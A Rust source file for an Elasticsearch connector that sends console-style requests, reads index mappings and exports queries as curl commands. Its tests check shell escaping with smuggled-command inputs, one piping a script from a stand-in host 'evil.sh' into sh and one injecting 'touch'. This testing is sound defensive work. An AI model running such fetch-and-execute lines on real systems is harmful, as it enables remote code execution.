//! Elasticsearch connector, modeled on Kibana's Dev Tools console: the
//! query input is a `METHOD /path` line plus an optional JSON body, sent to
//! the cluster as-is rather than limited to the Search API. Exposes only
//! `connector()` -- everything else here is this crate's own business.

use std::sync::Arc;

use async_trait::async_trait;

use tradar_connector_api::{Connector, ConnectorDescriptor, Session};
use tradar_core::capability::Capability;
use tradar_core::storage::SavedConnection;
use tradar_query_workbench::query_driver::{
    ColumnInfo, QueryDriver, QueryResult, SchemaInfo, Statement,
};
use tradar_query_workbench::query_engine::QueryEngine;

struct ElasticsearchDriver {
    base_url: String,
}

impl ElasticsearchDriver {
    fn new(base_url: &str) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
        }
    }
}

fn parse_query(query: &str) -> Option<(String, String, Option<String>)> {
    let mut lines = query.lines();
    let first = lines.next()?.trim();
    let mut parts = first.splitn(2, char::is_whitespace);
    let method = parts.next()?.to_string();
    let path = parts.next()?.trim().to_string();
    if method.is_empty() || path.is_empty() {
        return None;
    }
    let body = lines.collect::<Vec<_>>().join("\n");
    let body = body.trim();
    let body = if body.is_empty() {
        None
    } else {
        Some(body.to_string())
    };
    Some((method, path, body))
}

/// Escapes a string for safe interpolation inside a *single-quoted* shell
/// argument, using the standard close-quote / escaped-literal-quote /
/// reopen-quote technique: every `'` becomes `'\''`. Nothing else is special
/// inside single quotes, so this is sufficient on its own.
fn shell_escape_single_quoted(s: &str) -> String {
    s.replace('\'', r"'\''")
}

fn to_curl(base_url: &str, query: &str) -> Option<String> {
    let (method, path, body) = parse_query(query)?;
    let base_url = base_url.trim_end_matches('/');
    let url = format!("{base_url}/{}", path.trim_start_matches('/'));
    let url = shell_escape_single_quoted(&url);
    let method = method.to_uppercase();
    Some(match body {
        Some(body) => {
            let body = shell_escape_single_quoted(&body);
            format!("curl -X {method} '{url}' -H 'Content-Type: application/json' -d '{body}'")
        }
        None => format!("curl -X {method} '{url}'"),
    })
}

#[async_trait]
impl QueryDriver for ElasticsearchDriver {
    async fn connect(&mut self) -> anyhow::Result<()> {
        let response = reqwest::get(format!("{}/", self.base_url)).await?;
        if !response.status().is_success() {
            anyhow::bail!(
                "elasticsearch ping failed with status {}",
                response.status()
            );
        }
        Ok(())
    }

    /// The Dev-Tools-console vocabulary: HTTP verbs, the endpoints you
    /// reach for, and the Query-DSL keys that go in the body.
    fn keywords(&self) -> &'static [&'static str] {
        &[
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "HEAD",
            "_search",
            "_count",
            "_mapping",
            "_settings",
            "_cat/indices",
            "_cat/health",
            "_cat/nodes",
            "_bulk",
            "_doc",
            "_aliases",
            "_refresh",
            "query",
            "match",
            "match_all",
            "match_phrase",
            "term",
            "terms",
            "range",
            "bool",
            "must",
            "must_not",
            "should",
            "filter",
            "aggs",
            "sort",
            "size",
            "from",
            "_source",
            "exists",
            "wildcard",
            "prefix",
            "fuzzy",
            "nested",
        ]
    }

    /// A request is a `METHOD /path` line plus the JSON body that follows
    /// it, so a new verb line starts a new statement -- the same rule
    /// Kibana's Dev Tools console uses. Blank lines between requests are
    /// ignored rather than treated as separators, since a pretty-printed
    /// body can contain them.
    fn split_statements(&self, text: &str) -> Vec<Statement> {
        let mut statements: Vec<Statement> = Vec::new();
        let mut offset = 0;
        for line in text.split_inclusive('\n') {
            let trimmed = line.trim();
            let line_start = offset + (line.len() - line.trim_start().len());
            offset += line.len();
            if trimmed.is_empty() {
                continue;
            }
            match (starts_request(trimmed), statements.last_mut()) {
                (false, Some(current)) => {
                    // Continuation of the request above: extend it to here.
                    current.end = line_start + trimmed.len();
                    current.text = text[current.start..current.end].trim_end().to_string();
                }
                _ => statements.push(Statement {
                    text: trimmed.to_string(),
                    start: line_start,
                    end: line_start + trimmed.len(),
                }),
            }
        }
        statements
    }

    async fn ping(&self) -> anyhow::Result<()> {
        let response = reqwest::get(format!("{}/", self.base_url)).await?;
        if !response.status().is_success() {
            anyhow::bail!(
                "elasticsearch ping failed with status {}",
                response.status()
            );
        }
        Ok(())
    }

    async fn list_schema(&self) -> anyhow::Result<Vec<SchemaInfo>> {
        let url = format!("{}/_cat/indices?format=json", self.base_url);
        let indices: Vec<serde_json::Value> = reqwest::get(&url).await?.json().await?;

        // One `_mapping` call covers every index, so index fields cost a
        // single extra round trip no matter how many indices there are.
        // Failing to read mappings must not fail schema browsing itself --
        // the index list is still useful without field detail.
        let mappings: serde_json::Value =
            match reqwest::get(format!("{}/_mapping", self.base_url)).await {
                Ok(response) => response.json().await.unwrap_or(serde_json::Value::Null),
                Err(_) => serde_json::Value::Null,
            };

        Ok(indices
            .into_iter()
            .filter_map(|entry| {
                let name = entry.get("index").and_then(|v| v.as_str())?;
                Some(SchemaInfo {
                    name: name.to_string(),
                    columns: index_fields(&mappings, name),
                })
            })
            .collect())
    }

    async fn execute(&self, query: &str) -> anyhow::Result<QueryResult> {
        let (method, path, body) = parse_query(query)
            .ok_or_else(|| anyhow::anyhow!("expected \"METHOD /path\" on the first line"))?;
        let method = reqwest::Method::from_bytes(method.to_uppercase().as_bytes())
            .map_err(|_| anyhow::anyhow!("unknown HTTP method: {method}"))?;
        let url = format!("{}/{}", self.base_url, path.trim_start_matches('/'));

        let client = reqwest::Client::new();
        let mut request = client.request(method, &url);
        if let Some(body) = &body {
            request = request
                .header("Content-Type", "application/json")
                .body(body.clone());
        }
        let response = request.send().await?;
        // Most Elasticsearch APIs return JSON, but the `_cat` family (e.g.
        // `GET _cat/indices?v`) returns `text/plain` unless `format=json` is
        // passed. Read the body as text first and fall back to wrapping it
        // as a JSON string rather than erroring on a decode failure.
        let text = response.text().await?;
        let json = serde_json::from_str(&text).unwrap_or(serde_json::Value::String(text));
        Ok(QueryResult::Documents(vec![json]))
    }

    fn export_curl(&self, query: &str) -> Option<String> {
        to_curl(&self.base_url, query)
    }
}

const DESCRIPTOR: ConnectorDescriptor = ConnectorDescriptor {
    id: "elasticsearch",
    display_name: "Elasticsearch",
    icon: "🔍",
    capabilities: &[Capability::Query, Capability::Schema, Capability::Export],
};

struct ElasticsearchConnector;

#[async_trait]
impl Connector for ElasticsearchConnector {
    fn descriptor(&self) -> &ConnectorDescriptor {
        &DESCRIPTOR
    }

    async fn connect(&self, connection: SavedConnection) -> anyhow::Result<Box<dyn Session>> {
        let mut driver = ElasticsearchDriver::new(&connection.target);
        tradar_connector_api::with_connect_timeout(&connection.target, driver.connect()).await?;
        let driver: Arc<dyn QueryDriver> = Arc::new(driver);
        let schema = driver.list_schema().await.map_err(|e| e.to_string());
        Ok(Box::new(QueryEngine::new(driver, connection, schema)))
    }
}

pub fn connector() -> Box<dyn Connector> {
    Box::new(ElasticsearchConnector)
}

/// The fields of one index, read out of a `GET /_mapping` response.
fn index_fields(mappings: &serde_json::Value, index: &str) -> Vec<ColumnInfo> {
    let mut fields = Vec::new();
    if let Some(properties) = mappings
        .get(index)
        .and_then(|m| m.get("mappings"))
        .and_then(|m| m.get("properties"))
    {
        flatten_properties("", properties, &mut fields);
    }
    fields
}

/// Flattens a mapping's `properties` into `parent.child` paths, which is
/// how you refer to a nested field in a query anyway. An object node has
/// no `type` of its own, only more `properties`; a leaf's `type` is
/// reported as-is. Multi-fields (`fields`) are skipped: `title.keyword` is
/// an indexing detail rather than a field of the document.
fn flatten_properties(prefix: &str, properties: &serde_json::Value, out: &mut Vec<ColumnInfo>) {
    let Some(properties) = properties.as_object() else {
        return;
    };
    for (name, definition) in properties {
        let path = if prefix.is_empty() {
            name.clone()
        } else {
            format!("{prefix}.{name}")
        };
        match definition.get("properties") {
            Some(nested) => flatten_properties(&path, nested, out),
            None => out.push(ColumnInfo::new(
                path,
                definition
                    .get("type")
                    .and_then(|t| t.as_str())
                    .unwrap_or("object"),
            )),
        }
    }
}

/// Whether a line opens a new request: an HTTP verb followed by a path,
/// which is what separates one console request from the next.
fn starts_request(line: &str) -> bool {
    let mut words = line.split_whitespace();
    let Some(verb) = words.next() else {
        return false;
    };
    matches!(
        verb.to_ascii_uppercase().as_str(),
        "GET" | "POST" | "PUT" | "DELETE" | "HEAD" | "PATCH"
    ) && words.next().is_some()
}

#[cfg(test)]
mod tests {
    use super::*;
    use testcontainers_modules::elastic_search::ElasticSearch;
    use testcontainers_modules::testcontainers::runners::AsyncRunner;

    #[test]
    fn parse_query_splits_method_path_and_body() {
        let (method, path, body) =
            parse_query("POST my-index/_search\n{\"query\": {\"match_all\": {}}}").unwrap();

        assert_eq!(method, "POST");
        assert_eq!(path, "my-index/_search");
        assert_eq!(body.as_deref(), Some("{\"query\": {\"match_all\": {}}}"));
    }

    #[test]
    fn parse_query_allows_a_missing_body() {
        let (method, path, body) = parse_query("GET _cat/indices?v").unwrap();

        assert_eq!(method, "GET");
        assert_eq!(path, "_cat/indices?v");
        assert_eq!(body, None);
    }

    #[test]
    fn parse_query_rejects_a_missing_path() {
        assert!(parse_query("GET").is_none());
    }

    #[tokio::test]
    async fn connect_succeeds_for_a_running_cluster() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));

        let result = driver.connect().await;

        assert!(result.is_ok(), "connect failed: {:?}", result.err());
    }

    #[tokio::test]
    async fn list_schema_reports_index_fields_from_the_mapping() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        reqwest::Client::new()
            .put(format!("{base_url}/orders"))
            .header("content-type", "application/json")
            .body(
                r#"{"mappings":{"properties":{
                       "id":{"type":"long"},
                       "customer":{"properties":{"name":{"type":"text"}}}}}}"#,
            )
            .send()
            .await
            .unwrap();

        let schema = driver.list_schema().await.unwrap();

        let orders = schema
            .iter()
            .find(|entry| entry.name == "orders")
            .expect("the index we just created should be listed");
        let fields: Vec<&str> = orders.columns.iter().map(|c| c.name.as_str()).collect();
        assert!(fields.contains(&"id"), "fields were: {fields:?}");
        assert!(fields.contains(&"customer.name"), "fields were: {fields:?}");
    }

    #[tokio::test]
    async fn execute_runs_an_arbitrary_request_and_wraps_the_response_as_documents() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
        driver.connect().await.unwrap();

        let result = driver.execute("GET _cluster/health").await.unwrap();

        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(docs[0].get("status").is_some(), "response was: {docs:?}");
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn execute_handles_the_cat_indices_plain_text_response() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let mut driver = ElasticsearchDriver::new(&format!("http://127.0.0.1:{port}"));
        driver.connect().await.unwrap();

        let result = driver.execute("GET _cat/indices?v").await;

        let result = result.unwrap_or_else(|e| panic!("expected Ok, got error: {e:?}"));
        match result {
            QueryResult::Documents(docs) => {
                assert_eq!(docs.len(), 1);
                assert!(
                    docs[0].is_string(),
                    "expected a plain-text string, got: {docs:?}"
                );
                assert!(
                    docs[0].as_str().unwrap().contains("health"),
                    "expected the _cat/indices header row, got: {docs:?}"
                );
            }
            other => panic!("expected Documents, got {other:?}"),
        }
    }

    #[test]
    fn index_fields_flattens_nested_properties_into_paths() {
        let mappings = serde_json::json!({
            "orders": {
                "mappings": {
                    "properties": {
                        "id": {"type": "long"},
                        "customer": {
                            "properties": {
                                "name": {"type": "text"},
                                "address": {"properties": {"city": {"type": "keyword"}}}
                            }
                        }
                    }
                }
            }
        });

        let fields = index_fields(&mappings, "orders");

        let named: Vec<(&str, &str)> = fields
            .iter()
            .map(|c| (c.name.as_str(), c.type_name.as_str()))
            .collect();
        assert!(named.contains(&("id", "long")));
        assert!(
            named.contains(&("customer.name", "text")),
            "a nested field is named the way you'd write it in a query: {named:?}"
        );
        assert!(named.contains(&("customer.address.city", "keyword")));
        assert!(
            !named.iter().any(|(name, _)| *name == "customer"),
            "an object node is not itself a field: {named:?}"
        );
    }

    #[test]
    fn a_multi_field_is_not_reported_as_a_separate_field() {
        let mappings = serde_json::json!({
            "posts": {
                "mappings": {
                    "properties": {
                        "title": {
                            "type": "text",
                            "fields": {"keyword": {"type": "keyword"}}
                        }
                    }
                }
            }
        });

        let fields = index_fields(&mappings, "posts");

        assert_eq!(fields.len(), 1, "title.keyword is an indexing detail");
        assert_eq!(fields[0].name, "title");
        assert_eq!(fields[0].type_name, "text");
    }

    #[test]
    fn an_index_with_no_mapping_reports_no_fields() {
        let mappings = serde_json::json!({"other": {"mappings": {}}});

        assert!(index_fields(&mappings, "missing").is_empty());
        assert!(index_fields(&mappings, "other").is_empty());
        assert!(index_fields(&serde_json::Value::Null, "any").is_empty());
    }

    #[tokio::test]
    async fn list_schema_returns_created_indices() {
        let container = ElasticSearch::default().start().await.unwrap();
        let port = container.get_host_port_ipv4(9200).await.unwrap();
        let base_url = format!("http://127.0.0.1:{port}");
        let mut driver = ElasticsearchDriver::new(&base_url);
        driver.connect().await.unwrap();
        reqwest::Client::new()
            .put(format!("{base_url}/test-index"))
            .send()
            .await
            .unwrap();

        let schema = driver.list_schema().await.unwrap();

        assert!(
            schema.iter().any(|entry| entry.name == "test-index"),
            "schema was: {:?}",
            schema.iter().map(|s| &s.name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn to_curl_includes_the_body_when_present() {
        let curl = to_curl(
            "http://localhost:9200",
            "POST my-index/_search\n{\"query\":{\"match_all\":{}}}",
        )
        .unwrap();

        assert_eq!(
            curl,
            "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
        );
    }

    #[test]
    fn to_curl_omits_the_body_flags_when_there_is_no_body() {
        let curl = to_curl("http://localhost:9200", "GET _cat/indices?v").unwrap();

        assert_eq!(curl, "curl -X GET 'http://localhost:9200/_cat/indices?v'");
    }

    #[test]
    fn to_curl_returns_none_for_unparseable_queries() {
        assert!(to_curl("http://localhost:9200", "").is_none());
    }

    #[test]
    fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
        let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
        let curl = to_curl(
            "http://localhost:9200",
            &format!("POST my-index/_search\n{body}"),
        )
        .unwrap();

        // Every `'` in the body must be replaced with the close-quote /
        // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
        // stays a single shell argument with no early quote-close.
        let expected_escaped_body = r#"{"query": "'\''; curl evil.sh | sh; '\''"}"#;
        assert_eq!(
            curl,
            format!(
                "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{expected_escaped_body}'"
            )
        );
    }

    #[test]
    fn to_curl_escaped_body_round_trips_through_a_real_shell() {
        let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
        let curl = to_curl(
            "http://localhost:9200",
            &format!("POST my-index/_search\n{body}"),
        )
        .unwrap();

        // Run the generated command through a real shell, replacing `curl`
        // with `echo` so nothing actually hits the network, and assert the
        // shell reconstructs exactly the original (unescaped) body as a
        // single argument — proving the embedded `'; ...; '` never breaks
        // out of the quoted string.
        let script = curl.replacen("curl", "echo", 1);
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(&script)
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&output.stdout);

        assert!(
            !std::path::Path::new("/tmp/tradar-to-curl-test-should-not-exist").exists(),
            "the injected `touch` command ran — to_curl produced unsafe shell output: {curl}"
        );
        assert!(
            stdout.contains(body),
            "expected the shell-parsed output to contain the original body verbatim, got: {stdout}"
        );
    }
}
